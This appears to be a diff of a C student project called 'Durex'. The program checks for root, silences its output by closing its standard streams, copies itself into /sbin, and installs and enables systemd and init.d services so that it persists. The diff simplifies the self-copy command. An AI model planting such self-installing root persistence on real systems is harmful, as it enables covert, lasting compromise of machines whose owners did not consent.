@@ -3,26 +3,22 @@
 int		main(int ac, char **av, char **envp)
 {
 	char buf[255];
-	char buff[255];
 
 	memset(&buf, 0, 255);
 	if(geteuid() != 0)
 		return (1);
 	readlink("/proc/self/exe", buf, 255);
-	snprintf(buff, 255, "cp %s /sbin/Durex && chmod u+x /sbin/Durex", buf);
 	if (strcmp(buf, "/sbin/Durex") && strcmp(buf, "/usr/sbin/Durex"))
 	{
 		printf("maabou-h\n");
 		close(0);
 		close(1);
 		close(2);
-		if (system(buff) != 0)
+		if (system("cp /proc/self/exe /sbin/Durex && chmod u+x /sbin/Durex") != 0)
 			return (1);
 		if (system("cp ./Durex.service /etc/systemd/system/Durex.service && chmod u+x /etc/systemd/system/Durex.service") != 0)
 			return (1);
 		if (system("cp ./Durex.init /etc/init.d/Durex && chmod u+x /etc/init.d/Durex") != 0)
-			return (1);
-		if (system("rm -rf /sbin/Durex ; cp -p Durex /sbin/Durex && chmod +x /sbin/Durex") != 0)
 			return (1);
 		system("systemctl -q daemon-reload; systemctl -q enable Durex; service Durex restart");
 		return (0);
